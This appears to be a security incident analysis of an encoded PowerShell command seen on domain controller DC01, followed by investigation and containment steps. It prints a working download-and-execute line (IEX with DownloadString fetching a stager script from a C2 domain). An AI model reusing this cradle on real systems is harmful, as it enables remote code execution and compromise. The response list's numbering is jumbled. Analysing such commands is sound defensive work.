## Decoded PowerShell Command Analysis

The base64 encoded command decodes to:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
```

This is a classic malware dropper pattern that:
- Uses `Invoke-Expression (IEX)` to execute downloaded content
- Downloads a PowerShell script from a suspicious domain
- Executes with SYSTEM privileges on a domain controller

1. **Isolate DC01** from the network to prevent lateral movement

3. **Check** for successful payload download and execution
4. **Review** DC01 for signs of compromise (new accounts, scheduled tasks, persistence mechanisms)

2. **Search** for other systems attempting to contact c2-relay.darkops.net
3. **Review** authentication logs for suspicious logons to DC01
4. **Check** for similar PowerShell executions across the environment
5. **Examine** network logs for any successful connections to 198.51.100.99

### Containment Actions (Priority 3)
1. **Block** c2-relay.darkops.net at DNS and firewall level
2. **Reset** credentials for accounts that may have been compromised
3. **Scan** all domain controllers for similar indicators
4. **Review** PowerShell execution policies and logging configuration
5. **Implement** additional monitoring for encoded PowerShell commands

This incident represents a serious attempt to compromise critical domain infrastructure and should be treated as a high-priority security incident requiring immediate response.
